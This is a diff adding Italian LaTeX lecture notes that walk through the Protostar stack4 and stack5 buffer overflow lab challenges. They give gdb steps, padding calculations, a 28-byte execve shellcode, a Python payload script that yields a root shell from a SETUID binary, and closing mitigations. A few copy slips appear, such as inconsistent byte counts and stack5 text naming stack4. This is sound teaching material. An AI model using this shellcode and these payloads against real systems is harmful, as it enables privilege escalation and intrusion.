@@ -348,3 +348,255 @@ Vinciamo quindi la sfida.
     # scrivo script python e mando in pipe a stack3
     python -c 'print "a" * 64 + "\x24\x84\x04\x08"' | /opt/protostar/bin/stack3 
 \end{lstlisting}
+
+% ------------------ 
+% Protostar stack4
+% ------------------ 
+\section{Stack 4}
+Stack4 esamina il registro EIP e come può essere sovrascritto per modificare il flusso di un programma.
+Il programma in questione si chiama \textbf{stack4.c} e il suo eseguibile ha il seguente percorso: \textbf{/opt/protostar/bin/stack4}
+
+Il codice sorgente è il seguente
+\begin{lstlisting}[style=cstyle]
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+    printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+    char buffer[64];
+
+    gets(buffer);
+}
+\end{lstlisting}
+
+\subsection{Analisi del sorgente}
+Leggendo il sorgente notiamo che il programma stack4 accetta input locali, da tastiera o da altro processo (tramite pipe). L'input è una stringa generica e non sembrano esistere altri metodi per fornire input al programma.
+
+A differenza della sfida precedente, nel programma stack4 non c'è alcuna variabile esplicita da sovrascrivere.
+
+\subsection{Idea per risolvere la sfida}
+Abbiamo bisogno di trovare una locazione di memoria che, se sovrascritta, provoca una modifica del flusso di esecuzione. Possiamo usare la cella \textbf{indirizzo di ritorno} nello stack frame corrente.
+
+L'indirizzo di ritorno è una cella di dimensione pari all'architettura, quindi 4 byte nel caso di Protostar. Contiene l'indirizzo della prossima istruzione da eseguire al termine della funzione descritta nello stack frame.
+
+L'idea è sovrascrivere la cella indirizzo di ritorno con l'indirizzo della funzione win(). Per far ciò occorre identificare:
+\begin{itemize}
+    \item l'indirizzo della cella di memoria contenente l'indirizzo di ritorno
+    \item l'indirizzo della funzione win()
+\end{itemize}
+
+\subsection{Layout dello stack}
+Eseguiamo passo passo stack4 tramite \textbf{gdb} per ricostruire il layout dello stack. In tal modo capiremo in quale cella si trova l'indirizzo di ritorno. Lo stack frame da analizzare è quello della funzione \textbf{main}.
+
+Iniziamo con il recupero dell'indirizzo della funzione \textbf{win()}, tramite il comando \textcolor{red}{p} in gdb:
+\begin{lstlisting}[style=bashstyle]
+    $gdb -q /opt/protostar/bin/stack4
+    Reading symbols from /opt/protostar/bin/stack4...done
+    (gdb) p win 
+    $1 = {void (void)} 0x80483f4 <win>
+\end{lstlisting}
+
+A questo punto dobbiamo \textbf{disassemblare} il main() e capire cosa succede al suo interno. Usiamo il comando \textcolor{red}{disas} in gdb:
+\begin{lstlisting}[style=bashstyle]
+    (gdb) disassemble main
+\end{lstlisting}
+L'output è il seguente:
+\begin{figure}[h]
+    \includegraphics[width=\textwidth]{Capitolo 3/Figure/disas-main-stack4.png}
+\end{figure}
+
+Analizzando ogni singola istruzione capiamo che il layout dello stack è il seguente:
+\begin{figure}[h]
+    \includegraphics[width=\textwidth]{Capitolo 3/Figure/layout-stack4.png}
+\end{figure}
+\clearpage
+\textbf{N.B.}\begin{itemize}
+    \item 64 byte sono per buffer
+    \item 8 byte sono aggiunti dall'architettura per allineare lo stack ad un multiplo di 16
+    \item 4 byte sono per EBP
+\end{itemize}
+Quindi servono (64 + 8 + 4) byte, ovvero 76 byte di padding. Invece i successi 4 byte saranno quelli per sovrascrivere l'indirizzo di ritorno con l'indirizzo della funzione win().
+
+Costruiamo un input di 76 caratteri 'a' seguito dall'indirizzo di win() in formato Little Endian. L'input richiesto può essere generato con Python, facendo attenzione all'ordine dei byte:
+\begin{lstlisting}[style=bashstyle]
+    python -c 'print "a" * 76 + "\xf4\x83\x04\x08"'
+\end{lstlisting}
+Mandiamo stack4 in esecuzione con l'input appena creato con il comando:
+\begin{lstlisting}[style=bashstyle]
+    python -c 'print "a" * 76 + "\xf4\x83\x04\x08"' | /opt/protostar/bin/stack4 
+\end{lstlisting}
+Otteniamo il messaggio \begin{lstlisting}[style=bashstyle]
+    code flow succesfully changed
+    Segmentation fault
+\end{lstlisting}
+Il messaggio di Segmentation fault è causato dal fatto che dopo l'esecuzione di win() viene letto il valore successivo  sullo stack (rovinato), per riprendere il flusso di esecuzione. Tuttavia, tale fatto non costituisce un problema poichéè siamo riusciti a vincere la sfida.
+
+\subsection{Sintesi comandi da eseguire}
+\begin{lstlisting}[style=bashstyle]
+    $gdb -q /opt/protostar/bin/stack4
+    p win 
+    disassemble main
+    python -c 'print "a" * 76 + "\xf4\x83\x04\x08"' | /opt/protostar/bin/stack4
+\end{lstlisting}
+
+% ------------------ 
+% Protostar stack5
+% ------------------ 
+\section{Stack 5}
+Stack 5 esamina il buffer overflow e in particolare l'iniezione di shellcode tramite input.
+Il programma in questione si chiama \textbf{stack5.c} e il suo eseguibile ha il seguente percorso: \textbf{/opt/protostar/bin/stack5}
+
+Il codice sorgente è il seguente
+\begin{lstlisting}[style=cstyle]
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+    char buffer[64];
+
+    gets(buffer);
+}
+\end{lstlisting}
+
+\subsection{Analisi del sorgente}
+Leggendo il sorgente notiamo che il programma stack4 accetta input locali, da tastiera o da altro processo (tramite pipe). L'input è una stringa generica e non sembrano esistere altri metodi per fornire input al programma.
+
+Esaminando i metadati di stack5 scopriamo che esso è \textbf{SETUID root}.
+
+\subsection{Idea per risolvere la sfida}
+Nella sfida precedente, era presente il codice da eseguire (la funzione win()) per vincere la sfida. In questa sfida invece, è richiesta l'esecuzione di codice arbitrario. Tale codice, scritto in linguaggio macchina con codifica esadecimale, viene iniettato tramite l'input. In particolare utilizzeremo un codice macchina che esegue comandi di shell, ovvero uno \textbf{shelcode}.
+
+Produciamo un input contenente:
+\begin{itemize}
+    \item Lo shellcode (codificato in esadecimale)
+    \item Caratteri di padding fino all'indirizzo di ritorno
+    \item L'indirizzo iniziale dello shellcode (da scrivere nella cella contenente l'indirizzo di ritorno)
+    \item Eseguiamo \textbf{stack5} con tale input
+    \item Otteniamo una shell
+    \item Poiché stack5 è \textbf{SETUID root}, la shell è di root!
+\end{itemize}
+
+Lo shellcode codificato in esadecimale è il seguente:
+\begin{lstlisting}[style=pythonstyle]
+    "\x31\xc0\x50\x68\x2f\x2f\x73" + \
+    "\x68\x68\x2f\x62\x69\x6e\x89" + \
+    "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
+    "\xcd\x80\x31\xc0\x40\xcd\x80";
+\end{lstlisting}
+Questo shellcode esegue una shell e siccome SETUID è accesso, sarà una shell di root. La lunghezza è di 28 byte.
+
+\subsection{Layout dello stack}
+Eseguiamo passo passo stack5 tramite \textbf{gdb} per ricostruire il layout dello stack. In tal modo capiremo in quale cella si trova l'indirizzo di ritorno, ma soprattutto dobbiamo calcolare l'indirizzo dell inizio dello shellcode. Lo stack frame da analizzare è quello della funzione \textbf{main}.
+
+A questo punto dobbiamo \textbf{disassemblare} il main() e capire cosa succede al suo interno. Usiamo il comando \textcolor{red}{disas} in gdb:
+\begin{lstlisting}[style=bashstyle]
+    (gdb) disassemble main
+\end{lstlisting}
+L'output è il seguente:
+\begin{figure}[h]
+    \includegraphics[width=\textwidth]{Capitolo 3/Figure/disas-main-stack5.png}
+\end{figure}
+
+Analizzando ogni singola istruzione capiamo che il layout dello stack è il seguente:
+\begin{figure}[h]
+    \includegraphics[width=\textwidth]{Capitolo 3/Figure/layout-stack5.png}
+\end{figure}
+\clearpage
+\textbf{N.B.}\begin{itemize}
+    \item 28 byte sono per lo shellcode
+    \item 36 byte sono per buffer
+    \item 8 byte sono aggiunti dall'architettura per allineare lo stack ad un multiplo di 16
+    \item 4 byte sono per EBP
+\end{itemize}
+Quindi servono (28 + 32 + 8 + 4) byte, ovvero 76 byte di padding. Invece i successi 4 byte saranno quelli per sovrascrivere l'indirizzo di ritorno con l'indirizzo della funzione win().
+
+\textbf{NOTA BENE}
+\begin{mdframed}[backgroundcolor=gray!10,linewidth=1pt]
+Prima di recuperare l'indirizzo dello shellcode dobbiamo allineare gli indirizzi dello stack tra l'ambiente gdb e il terminale, altrimenti quando eseguiremo da terminale avremo un Segmentation fault.
+
+Quindi usiamo in gdb il comando:
+\begin{lstlisting}[style=bashstyle]
+    unset env LINES
+    unset env COLUMNS
+\end{lstlisting}
+Questo rimuoverà le varibili d'ambiente LINES e COLUMNS che gdb aggiunge e che rendono diversi gli indirizzi dello stack frame tra gdb e terminale.
+\end{mdframed}
+
+Per capire a che indirizzo si trova lo shellcode ci basta partire dall'indirizzo di EBP e andare (8 + 36 + 28) 72 verso indirizzi più bassi.
+Recuperiamo l'indirizzo di EBP in questo modo:
+\begin{itemize}
+    \item Mettiamo un breakpoint dopo la push \%EBP
+    \item Recuperiamo l'indirizzo di EBP con il comando \textcolor{red}{p \$ebp}
+    \item Eseguiamo in esadecimale l'operazione EBP - 72
+\end{itemize}
+\clearpage
+A questo punto possiamo scrivere il nostro script python \textbf{stack5.py} come segue:
+\begin{mdframed}
+    \begin{lstlisting}[style=pythonstyle]
+        #!/usr/bin/python
+        # Parametri da impostare
+        length = 76
+        ret = '\x5e\xf7\xff\xbf'
+        shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
+        "\x68\x68\x2f\x62\x69\x6e\x89" + \
+        "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
+        "\xcd\x80\x31\xc0\x40\xcd\x80";
+        padding = 'a' * (length - len(shellcode))
+        payload = shellcode + padding + ret
+        print payload
+    \end{lstlisting}
+\end{mdframed}
+
+Salviamo l'output dello script in un file nella directory temporanea \textbf{tmp}, con il comando:
+\begin{lstlisting}[style=bashstyle]
+    python stack5.py > /tmp/payload
+\end{lstlisting}
+Mandiamo in esecuzione il programma passandogli l'input malizioso appena creato:
+\begin{lstlisting}[style=bashstyle]
+    /opt/protostar/bin/stack5 < /tmp/payload
+\end{lstlisting}
+Viene eseguita \textbf{/bin/dash} ma termina immediatamente. Questo perché quando \textbf{/bin/sh} parte, lo stream STDIN è vuoto perché è stato drenato da gets(). Una lettura successiva su STDIN segnala EOF.
+
+La soluzione è quella di mantenere aperto il flusso di STDIN. Possiamo farlo modificando il comando di attacco nel modo seguente:
+\begin{lstlisting}[style=bashstyle]
+    (cat /tmp/payload; cat) | /opt/protostar/bin/stack5
+\end{lstlisting}
+Si usano due comandi \textbf{cat}:
+\begin{itemize}
+    \item Il primo inietta l'input malevolo e attiva la shell
+    \item Il secondo accetta input da \textbf{STDIN} e lo inoltra alla shell, mantenendo il flusso \textbf{STDIN} aperto
+\end{itemize}
+Eseguendo così stack5 viene avviata una shell, che è una shell di root, quindi vinciamo la sfida.
+
+\subsection{Debolezze}
+\begin{itemize}
+    \item privilegi di esecuzione ingiustamente elevati
+    \item La dimensione dell'input destinato ad una variabile di grandezza fissata non viene controllata
+    \item Di conseguenza, un input troppo grande corrompe lo stack
+\end{itemize}
+
+\subsection{Mitigazioni}
+\begin{enumerate}
+    \item Spegnere bit SETUID:
+    \begin{itemize}
+        \item autenticarsi come root e avviare una shell con il comando: \begin{lstlisting}[style=bashstyle] 
+        sudo -i
+        \end{lstlisting}
+        \item spegnere SETUID con il comando: \begin{lstlisting}[style=bashstyle] 
+        chmod u-s /opt/protostar/bin/stack5
+        \end{lstlisting}   
+        \item Eseguiamo stack5 e noteremo che l'attacco non va a buon fine. 
+    \end{itemize}
+    \item Limitare la lunghezza massima dell'input destinato ad una variabile di lunghezza fissata. Ad esempio, ciò può essere fatto evitando l’utilizzo di \textbf{gets()} in favore di \textbf{fgets()}.
+    Eseguiamo stack5 e la sfida non verrà vinta.
+\end{enumerate}
